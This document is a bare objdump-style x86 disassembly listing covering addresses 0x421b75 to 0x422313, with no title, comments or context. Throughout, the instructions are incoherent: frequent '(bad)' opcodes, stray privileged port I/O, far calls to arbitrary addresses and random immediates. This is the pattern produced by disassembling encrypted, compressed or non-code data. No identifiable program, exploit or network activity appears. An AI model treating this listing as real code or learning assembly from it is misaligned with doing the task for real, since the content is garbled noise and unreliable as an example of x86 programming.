  421b75:	mov    dl,0xb0
  421b77:	ss push eax
  421b79:	lock or DWORD PTR [edx+esi*2+0x42],ebx
  421b7e:	fwait
  421b7f:	ins    DWORD PTR es:[edi],dx
  421b80:	jecxz  0x421b3d
  421b82:	outs   dx,DWORD PTR ds:[esi]
  421b83:	scas   eax,DWORD PTR es:[edi]
  421b84:	icebp  
  421b85:	int3   
  421b86:	xor    bh,BYTE PTR fs:[ecx+0x79c79f72]
  421b8d:	and    DWORD PTR [ebp+0x3a],esp
  421b90:	test   BYTE PTR [edx+0x56],0x86
  421b94:	adc    ebp,ecx
  421b96:	adc    ebp,DWORD PTR [eax+0x5a662ad0]
  421b9c:	ja     0x421bb2
  421b9e:	or     esp,ebp
  421ba0:	(bad)  
  421ba1:	jg     0x421c1e
  421ba3:	xor    DWORD PTR [edi-0x4f4209df],eax
  421ba9:	mov    dh,0xdc
  421bab:	inc    edi
  421bac:	mov    edi,0xc46df34d
  421bb1:	(bad)  
  421bb2:	cmp    BYTE PTR [ebx+0x2f],bh
  421bb5:	mov    bh,0x9d
  421bb7:	xchg   ebp,eax
  421bb8:	les    ebx,FWORD PTR [ebp-0x5a]
  421bbb:	in     eax,dx
  421bbc:	pop    esp
  421bbd:	jae    0x421c06
  421bbf:	je     0x421c2d
  421bc1:	jno    0x421b45
  421bc3:	sahf   
  421bc4:	sbb    dh,BYTE PTR fs:[edi+0x7f]
  421bc8:	mov    ch,al
  421bca:	std    
  421bcb:	dec    esi
  421bcc:	test   DWORD PTR [esi],edx
  421bce:	inc    ebx
  421bcf:	std    
  421bd0:	retf   0x762b
  421bd3:	stos   DWORD PTR es:[edi],eax
  421bd4:	xor    al,0x9d
  421bd6:	mov    DWORD PTR [ebp+0x58d9001e],esp
  421bdc:	push   ecx
  421bdd:	scas   al,BYTE PTR es:[edi]
  421bde:	sbb    DWORD PTR [edx],esi
  421be0:	jbe    0x421c5c
  421be2:	clc    
  421be3:	cmp    eax,0x45f854c0
  421be8:	div    dl
  421bea:	repz ret 
  421bec:	ja     0x421be5
  421bee:	and    al,0x95
  421bf0:	mov    edx,0xb79e2548
  421bf5:	mov    al,ds:0x3959baab
  421bfa:	push   edx
  421bfb:	ja     0x421c56
  421bfd:	out    dx,eax
  421bfe:	imul   esi,DWORD PTR [ebx-0x22db8faa],0xa64574e5
  421c08:	lds    eax,FWORD PTR [esi]
  421c0a:	push   es
  421c0b:	call   FWORD PTR [ebp+0x6b]
  421c0e:	adc    al,bh
  421c10:	pop    ebp
  421c11:	xchg   esp,eax
  421c12:	adc    eax,0x702ae4d9
  421c17:	fmul   DWORD PTR [eax]
  421c19:	out    dx,al
  421c1a:	xor    BYTE PTR [ebx],dl
  421c1c:	jns    0x421c84
  421c1e:	mov    ebp,0x1544641b
  421c23:	fisub  WORD PTR [ebp+0x6aeb0f30]
  421c29:	test   al,0x8a
  421c2b:	imul   ecx,ebp,0x9e0696f4
  421c31:	(bad)  
  421c32:	sar    DWORD PTR [ecx],1
  421c34:	sti    
  421c35:	and    edx,edx
  421c37:	sar    DWORD PTR [edx],1
  421c39:	dec    eax
  421c3a:	xor    ah,BYTE PTR [ebp+0x240e5884]
  421c40:	addr16 (bad) 
  421c42:	repz int3 
  421c44:	mov    ebx,0xfe07a60d
  421c49:	add    BYTE PTR [ecx-0x65],bl
  421c4c:	cs jae 0x421c0b
  421c4f:	add    BYTE PTR [ecx+eiz*8],ah
  421c52:	out    dx,al
  421c53:	addr16 mov edi,0xcf385c07
  421c59:	retf   0x4a70
  421c5c:	into   
  421c5d:	and    al,0x2a
  421c5f:	shl    BYTE PTR [edx],1
  421c61:	sub    BYTE PTR [edx-0x34],0xdb
  421c65:	fs push edx
  421c67:	jmp    0x44f1d3ca
  421c6c:	dec    eax
  421c6d:	dec    DWORD PTR [esi+0x7]
  421c70:	bound  edi,QWORD PTR [ecx]
  421c72:	sub    al,0xe2
  421c74:	cmp    ebx,DWORD PTR [ecx]
  421c76:	or     DWORD PTR [edx+0x1adcde8a],esp
  421c7c:	inc    esp
  421c7d:	imul   edx,DWORD PTR [edi+eax*4-0x74],0xffffffa9
  421c82:	jae    0x421d00
  421c84:	stos   BYTE PTR es:[edi],al
  421c85:	aad    0x7e
  421c87:	into   
  421c88:	retf   0xc7e0
  421c8b:	(bad)  
  421c8c:	daa    
  421c8d:	pop    esp
  421c8e:	fidiv  DWORD PTR [ebx-0x16]
  421c91:	outs   dx,BYTE PTR ds:[esi]
  421c92:	and    BYTE PTR [edi],bh
  421c94:	mov    al,0xeb
  421c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c97:	xchg   ebp,eax
  421c98:	pop    esi
  421c99:	test   eax,0x10f966a8
  421c9e:	sbb    BYTE PTR [eax+0x22ba4d76],al
  421ca4:	cwde   
  421ca5:	inc    ebx
  421ca6:	xor    DWORD PTR [ebp+0x41a6815d],ebx
  421cac:	inc    esi
  421cad:	cs jnp 0x421c40
  421cb0:	inc    ebp
  421cb1:	push   esi
  421cb2:	mov    ebp,0x2179565f
  421cb7:	into   
  421cb8:	adc    BYTE PTR [ebp+eiz*4-0x62],al
  421cbc:	inc    edx
  421cbd:	or     al,bh
  421cbf:	mov    esi,0xc09e919c
  421cc4:	imul   eax,DWORD PTR [ecx-0x3216e13c],0x5e0c74c2
  421cce:	(bad)  
  421ccf:	xchg   ebp,eax
  421cd0:	or     al,0xb3
  421cd2:	cmp    DWORD PTR [ebp+0x69],ecx
  421cd5:	xor    esp,eax
  421cd7:	sbb    bl,BYTE PTR [ecx-0x426e8054]
  421cdd:	dec    ax
  421cdf:	xchg   ecx,eax
  421ce0:	loopne 0x421cab
  421ce2:	fidivr DWORD PTR [esi-0x3cbe929]
  421ce8:	aas    
  421ce9:	xchg   esp,eax
  421cea:	cli    
  421ceb:	mov    fs,WORD PTR gs:[eax-0x69b28e16]
  421cf2:	outs   dx,BYTE PTR ds:[esi]
  421cf3:	jne    0x421d36
  421cf5:	dec    eax
  421cf6:	mov    dl,0xe6
  421cf8:	aad    0xb9
  421cfa:	out    dx,al
  421cfb:	and    ebx,DWORD PTR [edi]
  421cfd:	sti    
  421cfe:	dec    eax
  421cff:	xchg   edi,eax
  421d00:	(bad)  
  421d01:	dec    ebp
  421d02:	push   0xff861bed
  421d07:	jns    0x421cad
  421d09:	mov    bl,0xef
  421d0b:	push   esp
  421d0c:	adc    ebx,ecx
  421d0e:	mov    eax,0x2cb8cab
  421d13:	das    
  421d14:	xchg   ebx,eax
  421d15:	sub    dl,dl
  421d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d18:	and    bh,BYTE PTR [edx+0x3e70c02d]
  421d1e:	pushf  
  421d1f:	sti    
  421d20:	inc    esp
  421d21:	push   es
  421d22:	aam    0x8b
  421d24:	leave  
  421d25:	cmc    
  421d26:	mov    ds:0x8d1e5a46,al
  421d2b:	mov    ecx,0xecf9d3eb
  421d30:	hlt    
  421d31:	inc    esi
  421d32:	retf   0xa96b
  421d35:	ins    DWORD PTR es:[edi],dx
  421d36:	jg     0x421d9f
  421d38:	sbb    DWORD PTR [ebx+ebp*1-0x13],edx
  421d3c:	jmp    DWORD PTR [edi-0x152b2489]
  421d42:	xor    BYTE PTR [edx-0x1ca6eb9c],ch
  421d48:	pop    ebp
  421d49:	aas    
  421d4a:	push   edx
  421d4b:	cmp    ch,bl
  421d4d:	cli    
  421d4e:	dec    ebx
  421d4f:	xlat   BYTE PTR ds:[ebx]
  421d50:	cs mov dl,0xbb
  421d53:	sub    DWORD PTR [eax],ebx
  421d55:	add    BYTE PTR [ebp-0x7b],0xf0
  421d59:	mov    edi,0x86e13258
  421d5e:	mov    eax,fs
  421d60:	pop    es
  421d61:	sbb    al,0x92
  421d63:	xchg   esp,eax
  421d64:	fs sub esi,esp
  421d67:	adc    eax,0x472d1513
  421d6c:	ss cmp eax,0xcc073e88
  421d72:	and    al,0x40
  421d74:	pop    es
  421d75:	cmp    ch,dh
  421d77:	and    DWORD PTR [ebx],edx
  421d79:	xor    DWORD PTR [esi-0x30],edx
  421d7c:	int3   
  421d7d:	and    dh,BYTE PTR [edi+0xa]
  421d80:	jecxz  0x421dd8
  421d82:	inc    edx
  421d83:	popf   
  421d84:	inc    esp
  421d85:	arpl   WORD PTR [ecx+ebx*8],si
  421d88:	clc    
  421d89:	inc    edx
  421d8a:	xchg   ebp,eax
  421d8b:	test   al,0xba
  421d8d:	mov    ebx,0xabbacf9a
  421d92:	sbb    al,0xf9
  421d94:	xchg   ebp,eax
  421d95:	sbb    eax,0xdfe8bc59
  421d9a:	pop    esp
  421d9b:	cmp    al,0x84
  421d9d:	adc    DWORD PTR ds:0xd4b74ee0,ebx
  421da3:	and    BYTE PTR [eax],dl
  421da5:	add    edi,esi
  421da7:	or     ch,BYTE PTR [edi+ecx*8-0x23]
  421dab:	mov    esp,0x832bd4cb
  421db0:	mov    ch,0x74
  421db2:	leave  
  421db3:	pop    esi
  421db4:	shr    DWORD PTR [edi-0x19],cl
  421db7:	mov    ecx,ebp
  421db9:	test   al,0xeb
  421dbb:	mov    ebp,0xcbb46478
  421dc0:	mov    ds:0x95b73b68,eax
  421dc5:	in     eax,0x34
  421dc7:	push   es
  421dc8:	sbb    edi,DWORD PTR [esi-0x17accc52]
  421dce:	pushf  
  421dcf:	jg     0x421d55
  421dd1:	in     al,0x90
  421dd3:	push   edx
  421dd4:	int    0xf1
  421dd6:	push   edi
  421dd7:	adc    BYTE PTR [eax],bl
  421dd9:	sbb    al,bl
  421ddb:	or     ch,BYTE PTR [ecx-0x4bbee519]
  421de1:	xchg   esi,eax
  421de2:	dec    edi
  421de3:	jl     0x421e56
  421de5:	sbb    al,0x9d
  421de7:	popf   
  421de8:	sbb    DWORD PTR [ecx],edi
  421dea:	push   es
  421deb:	mov    ecx,0x55b90fd1
  421df0:	adc    bl,bh
  421df2:	outs   dx,DWORD PTR ds:[esi]
  421df3:	rol    BYTE PTR [ebx-0x25],cl
  421df6:	push   0xa0106596
  421dfb:	out    0x26,al
  421dfd:	das    
  421dfe:	arpl   WORD PTR [ecx-0x64],di
  421e01:	sub    BYTE PTR [edi-0xddce214],ah
  421e07:	dec    ebp
  421e08:	icebp  
  421e09:	(bad)  
  421e0a:	push   ds
  421e0b:	into   
  421e0c:	inc    edi
  421e0d:	mov    ?,WORD PTR [ecx+ebx*4-0xc]
  421e11:	in     al,dx
  421e12:	test   BYTE PTR [ebx+0x27a97473],bh
  421e18:	adc    al,0x1
  421e1a:	leave  
  421e1b:	xor    DWORD PTR [ebx+0x17cf76e4],eax
  421e21:	jne    0x421e1a
  421e23:	fidiv  DWORD PTR es:[edx]
  421e26:	pushf  
  421e27:	stos   BYTE PTR es:[edi],al
  421e28:	shl    DWORD PTR [edi+ebp*2],1
  421e2b:	push   esi
  421e2c:	cmc    
  421e2d:	sub    esp,esp
  421e2f:	test   BYTE PTR [edx+0x8],bl
  421e32:	fs out dx,al
  421e34:	and    eax,0x1d733e9d
  421e39:	jne    0x421e59
  421e3b:	mov    WORD PTR [edi+0xb],ss
  421e3e:	cmp    eax,0xe56ee868
  421e43:	dec    esp
  421e44:	lods   al,BYTE PTR ds:[esi]
  421e45:	mov    al,ds:0xbdd009
  421e4a:	mov    al,ds:0xf93c7572
  421e4f:	sbb    edx,DWORD PTR [ecx]
  421e51:	mov    bh,0xe2
  421e53:	les    esi,FWORD PTR [edx-0x58]
  421e56:	pop    ebp
  421e57:	cmp    BYTE PTR [esi-0x1fb663b6],0xf1
  421e5e:	std    
  421e5f:	mov    edi,0x45386832
  421e64:	mov    dl,0x75
  421e66:	aad    0x4
  421e68:	in     eax,0xe3
  421e6a:	(bad)  
  421e6c:	and    edi,eax
  421e6e:	es add bh,0x95
  421e72:	call   0xc7a1:0x6134deb
  421e79:	mov    WORD PTR [esp+ebx*8+0x17],?
  421e7d:	ds (bad) 
  421e7f:	xor    dh,dl
  421e81:	aad    0x45
  421e83:	add    BYTE PTR ds:0xda1f5e89,bh
  421e89:	aaa    
  421e8a:	retf   
  421e8b:	pop    ss
  421e8c:	outs   dx,BYTE PTR ds:[esi]
  421e8d:	leave  
  421e8e:	dec    ecx
  421e8f:	and    esi,DWORD PTR [esi]
  421e91:	add    BYTE PTR [ebp+0x57],bh
  421e94:	mov    bh,ah
  421e96:	adc    eax,0xdd8ff3c0
  421e9b:	in     eax,0xeb
  421e9d:	pop    eax
  421e9e:	ret    0xcffc
  421ea1:	sub    esi,eax
  421ea3:	lods   al,BYTE PTR ds:[esi]
  421ea4:	ret    
  421ea5:	sbb    al,0xda
  421ea7:	cwde   
  421ea8:	dec    edx
  421ea9:	mov    edi,0xffa0b265
  421eae:	sub    DWORD PTR [eax],ebx
  421eb0:	neg    DWORD PTR [esi]
  421eb2:	cmc    
  421eb3:	sbb    eax,DWORD PTR [edi]
  421eb5:	sbb    bl,ch
  421eb7:	ins    DWORD PTR es:[edi],dx
  421eb8:	xor    BYTE PTR [ecx-0x41],al
  421ebb:	dec    esi
  421ebc:	in     al,dx
  421ebd:	xchg   ecx,eax
  421ebe:	cdq    
  421ebf:	rcl    BYTE PTR [ecx+0x9],0x62
  421ec3:	js     0x421f3f
  421ec5:	data16 add al,0x51
  421ec8:	xchg   esp,ebp
  421eca:	dec    edi
  421ecb:	jbe    0x421eaa
  421ecd:	fwait
  421ece:	pop    ss
  421ecf:	pop    ebx
  421ed0:	xor    ah,bh
  421ed2:	lahf   
  421ed3:	mov    al,0x26
  421ed5:	jecxz  0x421ec6
  421ed7:	jns    0x421edb
  421ed9:	lods   eax,DWORD PTR ds:[esi]
  421eda:	sti    
  421edb:	pop    ss
  421edc:	jae    0x421e68
  421ede:	cmp    DWORD PTR [edi+0x67],esi
  421ee1:	adc    eax,0x5c38497e
  421ee6:	leave  
  421ee7:	fist   WORD PTR [edx-0x5651d4c]
  421eed:	in     al,0xa3
  421eef:	(bad)  
  421ef0:	mov    edi,0x886ffe1d
  421ef5:	inc    esp
  421ef6:	mov    dh,0xae
  421ef8:	lea    esp,[ecx-0x4acfb3e7]
  421efe:	push   esp
  421eff:	cmp    dl,0x3b
  421f02:	mov    ecx,0x35f562da
  421f07:	rcr    ebx,0xed
  421f0a:	cli    
  421f0b:	dec    esi
  421f0c:	repnz or bh,al
  421f0f:	jbe    0x421eb9
  421f11:	mov    WORD PTR [ebx],fs
  421f13:	sbb    BYTE PTR [ecx+0x7db55911],al
  421f19:	dec    ebx
  421f1a:	cmp    al,0xca
  421f1c:	sub    al,0x75
  421f1e:	xor    al,0xba
  421f20:	and    DWORD PTR [edx],ebp
  421f22:	xor    eax,0xf3fe7bc4
  421f27:	fld    DWORD PTR [ebp-0x72]
  421f2a:	mov    ebx,0x3d2e6c44
  421f2f:	cli    
  421f30:	lock out 0x23,al
  421f33:	test   DWORD PTR [edi+0x781b7565],ebp
  421f39:	je     0x421f91
  421f3b:	mov    ds,ecx
  421f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f3e:	repnz cmp esp,edx
  421f41:	inc    esi
  421f42:	dec    edi
  421f43:	cmp    ebx,DWORD PTR [esi]
  421f45:	adc    bh,BYTE PTR [esi+0x67]
  421f48:	pop    ebp
  421f49:	cdq    
  421f4a:	xchg   ecx,eax
  421f4b:	dec    edx
  421f4c:	jo     0x421f79
  421f4e:	and    ecx,DWORD PTR [ebx-0x73]
  421f51:	(bad)  
  421f52:	lea    edi,[ecx]
  421f54:	jmp    0x730558ff
  421f59:	sar    BYTE PTR [ebx],1
  421f5b:	(bad)
  421f5e:	loopne 0x421f01
  421f60:	cld    
  421f61:	cmp    DWORD PTR [esi+0x10],eax
  421f64:	(bad)  
  421f65:	aad    0x18
  421f67:	jne    0x421f0f
  421f69:	mov    ebx,0xcb804e5c
  421f6e:	and    BYTE PTR [edi+0x37],bh
  421f71:	adc    al,cl
  421f73:	mov    cl,0xf6
  421f75:	mov    ecx,0x93b6f20e
  421f7a:	lock int3 
  421f7c:	test   BYTE PTR [edi+0x5766fb83],ch
  421f82:	xchg   esp,esi
  421f84:	dec    edi
  421f85:	mov    edx,0x88734f27
  421f8a:	add    DWORD PTR [edi],esp
  421f8c:	dec    ebx
  421f8d:	jg     0x421f98
  421f8f:	xchg   edx,eax
  421f90:	cld    
  421f91:	xchg   ecx,eax
  421f92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f93:	or     BYTE PTR [edi-0x75],al
  421f96:	test   eax,0x8d7e0adb
  421f9b:	sub    edi,eax
  421f9d:	pop    esi
  421f9e:	popa   
  421f9f:	shr    dh,cl
  421fa1:	inc    eax
  421fa2:	neg    BYTE PTR [edx]
  421fa4:	ja     0x421fcb
  421fa6:	pop    es
  421fa7:	cmp    al,0xb7
  421fa9:	mov    ds:0x73fcbdba,al
  421fae:	je     0x421ff4
  421fb0:	loop   0x421f68
  421fb2:	lock rcl DWORD PTR [ebx+ecx*4-0xd3a1d31],cl
  421fba:	inc    esp
  421fbb:	push   ecx
  421fbc:	cmp    eax,0x764fee71
  421fc1:	add    eax,DWORD PTR [edi]
  421fc3:	sbb    al,0x4c
  421fc5:	cli    
  421fc6:	add    edx,DWORD PTR [ecx]
  421fc8:	and    dh,ch
  421fca:	sub    DWORD PTR gs:[edx-0x7d],edi
  421fce:	jns    0x422049
  421fd0:	mov    bl,0x2
  421fd2:	bound  esp,QWORD PTR [eax+edi*1-0x7aa21bf]
  421fd9:	and    DWORD PTR [edx-0x143190f4],ebp
  421fdf:	inc    ecx
  421fe0:	rcl    BYTE PTR [esi-0x19],cl
  421fe3:	and    bh,BYTE PTR [ebx-0x76c44eaf]
  421fe9:	xchg   ecx,eax
  421fea:	icebp  
  421feb:	jno    0x421f8a
  421fed:	dec    ebx
  421fee:	pop    eax
  421fef:	mov    ds:0x20ed490a,al
  421ff4:	pop    eax
  421ff5:	fsub   st,st(2)
  421ff7:	or     al,0xad
  421ff9:	clc    
  421ffa:	lock cli 
  421ffc:	mov    edx,0x925da489
  422001:	test   eax,0xa45602ef
  422006:	shl    BYTE PTR [eax+0x5fdb39c5],0xf
  42200d:	mov    cl,0xc3
  42200f:	xor    al,0xd0
  422011:	dec    esi
  422012:	sar    esi,cl
  422014:	xchg   ebx,eax
  422015:	ins    BYTE PTR es:[edi],dx
  422016:	sub    dh,BYTE PTR [esi-0x7e6b885]
  42201c:	sub    edx,edx
  42201e:	cdq    
  42201f:	mov    dl,0x93
  422021:	and    eax,0xa4e7632e
  422026:	pushf  
  422027:	add    DWORD PTR [ebp+0x59],ecx
  42202a:	rcr    DWORD PTR [esi-0x564f323c],0x32
  422031:	jge    0x421fbc
  422033:	lods   eax,DWORD PTR ds:[esi]
  422034:	scas   eax,DWORD PTR es:[edi]
  422035:	(bad)  
  422037:	push   edx
  422038:	xor    bh,BYTE PTR [edx+0x35]
  42203b:	test   eax,0x79ea1cac
  422040:	into   
  422041:	cs je  0x421ffa
  422044:	pop    edi
  422045:	inc    eax
  422046:	xor    dh,BYTE PTR [edi+0x73]
  422049:	xchg   esp,eax
  42204a:	pop    es
  42204b:	sub    cl,BYTE PTR [eax+0x5e]
  42204e:	mov    edx,0xd06926f7
  422053:	sbb    DWORD PTR [esi+0x60],ecx
  422056:	shr    BYTE PTR [ecx],1
  422058:	pop    ebp
  422059:	inc    esi
  42205a:	out    0x44,eax
  42205c:	jbe    0x4220d9
  42205e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42205f:	mov    ds:0x8bf7d055,al
  422064:	mov    BYTE PTR [ecx+0x6b972647],dl
  42206a:	mov    ds:0x16b1f303,eax
  422070:	jmp    0xc897e315
  422075:	repz test BYTE PTR [esp+ecx*2+0x2b9914fa],cl
  42207d:	push   ebp
  42207e:	dec    esi
  42207f:	mov    ds:0x4fd1c648,al
  422084:	mov    edi,0x8579649b
  422089:	or     ecx,DWORD PTR cs:[ebx]
  42208c:	or     DWORD PTR [ebx+0x4f634944],eax
  422092:	nop
  422093:	dec    esp
  422094:	inc    edx
  422095:	pop    edx
  422096:	add    DWORD PTR [edi-0xe],0x82bfdac1
  42209d:	push   edi
  42209e:	mov    ebx,0x25b22610
  4220a3:	icebp  
  4220a4:	adc    BYTE PTR [eax+edx*4-0x1b],ah
  4220a8:	in     eax,dx
  4220a9:	xlat   BYTE PTR ds:[ebx]
  4220aa:	outs   dx,DWORD PTR ds:[esi]
  4220ab:	jae    0x42204e
  4220ad:	jle    0x422126
  4220af:	imul   ecx,DWORD PTR [ecx+0x5ee60f4a],0xffffffef
  4220b6:	push   ds
  4220b7:	and    eax,ebp
  4220b9:	popa   
  4220ba:	pop    ebx
  4220bb:	cmc    
  4220bc:	int3   
  4220bd:	xor    DWORD PTR [edx],esp
  4220bf:	adc    BYTE PTR [edx+edx*2],bl
  4220c2:	cs push esp
  4220c4:	ror    DWORD PTR [ebx-0x34],0xd
  4220c8:	xor    eax,DWORD PTR [ecx]
  4220ca:	shl    BYTE PTR [ebx],0x91
  4220cd:	rcl    DWORD PTR [ebx+0x584f2d81],1
  4220d3:	mov    edi,0x38a7e919
  4220d8:	out    0x5,eax
  4220da:	call   0x872d6fe9
  4220df:	add    ebp,DWORD PTR [ebp+ebx*4+0xb4ed30d]
  4220e6:	lea    ebx,[ecx+0x4dd02b1b]
  4220ec:	sbb    BYTE PTR [ebp+0x36],bh
  4220ef:	and    eax,0x461b37a7
  4220f4:	jg     0x422103
  4220f6:	dec    edi
  4220f7:	push   0xe9856aaa
  4220fc:	or     al,0xd4
  4220fe:	push   eax
  4220ff:	adc    BYTE PTR [esi+0x7c],al
  422102:	and    eax,0xc1d860a4
  422107:	into   
  422108:	leave  
  422109:	cmp    eax,0xa3d31b68
  42210e:	nop
  42210f:	loopne 0x4220f8
  422111:	aaa    
  422112:	neg    BYTE PTR [eax]
  422114:	mov    edx,0xde3d7c55
  422119:	push   ds
  42211a:	imul   ebx,esp,0x57995717
  422120:	stos   DWORD PTR es:[edi],eax
  422121:	and    BYTE PTR [edx-0x7269e227],bl
  422127:	inc    eax
  422128:	xchg   edx,eax
  422129:	push   0xe1965b73
  42212e:	lods   al,BYTE PTR ds:[esi]
  42212f:	pop    ds
  422130:	stos   DWORD PTR es:[edi],eax
  422131:	int    0x73
  422133:	jmp    0x4c976fac
  422138:	xor    DWORD PTR [ebp-0x70],edi
  42213b:	push   edx
  42213c:	mov    ds:0x9fee12d2,al
  422141:	jle    0x42214a
  422143:	retf   0xe61e
  422146:	mov    es,ebx
  422148:	repz ret 
  42214a:	pop    ebx
  42214b:	jecxz  0x4221a3
  42214d:	shl    BYTE PTR ds:0x8521379,1
  422153:	outs   dx,DWORD PTR ds:[esi]
  422154:	add    al,0xab
  422156:	outs   dx,DWORD PTR ds:[esi]
  422157:	icebp  
  422158:	div    ch
  42215a:	inc    ebx
  42215b:	retf   0xccb1
  42215e:	dec    ebx
  42215f:	sbb    DWORD PTR [ebx+0x91d85b5],ecx
  422165:	adc    BYTE PTR [edx],ch
  422167:	cwde   
  422168:	cmc    
  422169:	aam    0xf5
  42216b:	addr16 pusha 
  42216d:	clc    
  42216e:	cmp    BYTE PTR [esi-0x5e],ch
  422171:	je     0x422124
  422173:	mov    ebp,0xf01dfd15
  422178:	mov    ebp,eax
  42217a:	jge    0x42210e
  42217c:	fist   DWORD PTR [ecx+0xdf5b2de]
  422182:	ror    BYTE PTR [ebp-0x7b59e896],0x76
  422189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42218a:	mov    bh,0xee
  42218c:	sbb    DWORD PTR [edx],edx
  42218e:	aad    0x4f
  422190:	mov    BYTE PTR [ebx+0x6f],dh
  422193:	out    0x19,al
  422195:	push   cs
  422196:	loopne 0x4221c8
  422198:	leave  
  422199:	xlat   BYTE PTR ds:[ebx]
  42219a:	adc    DWORD PTR [ecx+0x3f],esi
  42219d:	in     al,0xe0
  42219f:	hlt    
  4221a0:	imul   ebp,DWORD PTR [eax+0x34],0xac633ee3
  4221a7:	pop    esp
  4221a8:	xchg   esi,eax
  4221a9:	test   BYTE PTR [ecx],dh
  4221ab:	shl    BYTE PTR [ecx+0x10f994bd],cl
  4221b1:	mov    fs,WORD PTR [edx+0x23]
  4221b4:	xchg   edx,eax
  4221b5:	add    al,0x9a
  4221b7:	out    0xa9,eax
  4221b9:	jle    0x42217c
  4221bb:	push   edi
  4221bc:	fsubr  st(3),st
  4221be:	fdiv   QWORD PTR [edi+ebx*1-0x45]
  4221c2:	add    al,0x25
  4221c4:	test   DWORD PTR [esi+0x1286541a],ebx
  4221ca:	ins    DWORD PTR es:[edi],dx
  4221cb:	pop    ebp
  4221cc:	cwde   
  4221cd:	dec    ebx
  4221ce:	push   esi
  4221cf:	mov    edi,0x22311e6f
  4221d4:	push   ecx
  4221d5:	add    DWORD PTR [eax-0x5d392806],edx
  4221db:	xchg   edx,eax
  4221dc:	(bad)  
  4221de:	xor    al,0x96
  4221e0:	push   es
  4221e1:	inc    DWORD PTR [edx]
  4221e3:	pop    ds
  4221e4:	adc    edx,DWORD PTR [ebp-0x30]
  4221e7:	test   al,0x1d
  4221e9:	imul   ecx,DWORD PTR [eax-0x5c],0xffffffc3
  4221ed:	fidivr DWORD PTR [edx-0x3]
  4221f0:	pop    esp
  4221f1:	mov    al,ds:0xbaeef2ba
  4221f6:	das    
  4221f7:	adc    cl,BYTE PTR ds:0xa1f10060
  4221fd:	pop    esi
  4221fe:	inc    eax
  4221ff:	inc    ebx
  422200:	sub    dh,al
  422202:	or     al,0x2a
  422204:	inc    esp
  422205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422206:	add    BYTE PTR [ecx],ch
  422208:	(bad)
  42220b:	add    al,0xaa
  42220d:	popf   
  42220e:	enter  0x4589,0xa
  422212:	(bad)  [eax+esi*1-0x9]
  422216:	dec    esi
  422217:	sub    ebx,DWORD PTR [edi]
  422219:	es jge 0x422207
  42221c:	mov    bl,0x67
  42221e:	das    
  42221f:	(bad)  
  422221:	mov    dh,BYTE PTR [eax]
  422223:	and    al,al
  422225:	dec    ecx
  422226:	repnz xlat BYTE PTR ds:[ebx]
  422228:	xchg   esi,eax
  422229:	push   0x47
  42222b:	fneni(8087 only) 
  42222d:	cwde   
  42222e:	mov    bl,0xe9
  422230:	cwde   
  422231:	and    BYTE PTR [eax+0x79],0x37
  422235:	mov    ah,0x94
  422237:	in     al,dx
  422238:	outs   dx,DWORD PTR ds:[esi]
  422239:	xor    al,dh
  42223b:	xchg   esp,eax
  42223c:	icebp  
  42223d:	call   0xd13d:0x2d40341e
  422244:	mov    edx,0xba59e4a2
  422249:	jns    0x4222be
  42224b:	pop    ss
  42224c:	in     eax,0x39
  42224e:	mov    esi,0x645c484a
  422253:	xor    eax,0xc5ad6fab
  422258:	sbb    eax,0x55044321
  42225d:	js     0x4222b3
  42225f:	xor    BYTE PTR [eax+eiz*8+0x10],dl
  422263:	xchg   bl,bh
  422265:	in     al,dx
  422266:	psubw  mm0,QWORD PTR [ecx-0x17]
  42226a:	cmp    DWORD PTR [ebp+0x5a],ecx
  42226d:	sbb    edi,edx
  42226f:	fadd   st,st(6)
  422271:	sbb    al,0x2
  422273:	push   eax
  422274:	sbb    BYTE PTR [edx],0x58
  422277:	push   esp
  422278:	mov    WORD PTR [edi],?
  42227a:	jl     0x422207
  42227c:	enter  0xfe34,0x64
  422280:	outs   dx,DWORD PTR ds:[esi]
  422281:	inc    edi
  422282:	and    eax,0x9992d147
  422287:	sub    al,0xe5
  422289:	sub    BYTE PTR [eax+0xa],cl
  42228c:	stos   BYTE PTR es:[edi],al
  42228d:	ins    DWORD PTR es:[edi],dx
  42228e:	jnp    0x422278
  422290:	mov    bl,0xd1
  422292:	push   edx
  422293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422294:	ss push ecx
  422296:	pop    ebx
  422297:	push   0x44652469
  42229c:	cmp    ebp,DWORD PTR [ebx+0x49bdbf37]
  4222a2:	daa    
  4222a3:	loopne 0x4222a1
  4222a5:	lock ss mov dh,0x7f
  4222a9:	xlat   BYTE PTR ds:[ebx]
  4222aa:	xor    al,0x3e
  4222ac:	push   0xffffffc3
  4222ae:	xor    eax,0x8c56c0b1
  4222b3:	int3   
  4222b4:	(bad)  
  4222b5:	int3   
  4222b6:	test   DWORD PTR [edx+0xe],ecx
  4222b9:	push   es
  4222ba:	lods   al,BYTE PTR ds:[esi]
  4222bb:	out    0x78,eax
  4222bd:	int    0x39
  4222bf:	popf   
  4222c0:	cwde   
  4222c1:	mov    ecx,0x1e370647
  4222c6:	pop    ebp
  4222c7:	cmp    dl,BYTE PTR [edi+edx*4+0x626421b7]
  4222ce:	push   cs
  4222cf:	es cmp eax,0x5025c956
  4222d5:	xchg   DWORD PTR [ebx],esp
  4222d7:	dec    eax
  4222d8:	jmp    0xaf84bad7
  4222dd:	dec    edi
  4222de:	stos   DWORD PTR es:[edi],eax
  4222df:	sti    
  4222e0:	dec    esp
  4222e1:	xor    esi,DWORD PTR [ebp+0x255a8568]
  4222e7:	pop    edi
  4222e8:	rol    dl,1
  4222ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222eb:	div    BYTE PTR [ecx-0x71]
  4222ee:	out    dx,al
  4222ef:	out    0x38,al
  4222f1:	or     esp,DWORD PTR [edx-0x44]
  4222f4:	xchg   DWORD PTR [edx+0x3c25ccd9],esi
  4222fa:	iret   
  4222fb:	pushf  
  4222fc:	or     ecx,DWORD PTR [ebp-0x7052c82b]
  422302:	out    dx,eax
  422303:	jl     0x422287
  422305:	mov    ecx,0x7030ee63
  42230a:	jne    0x4222da
  42230c:	data16 fninit 
  42230f:	iret   
  422310:	imul   eax,DWORD PTR [ebx],0xffffffc6
  422313:	mov    ebp,fs
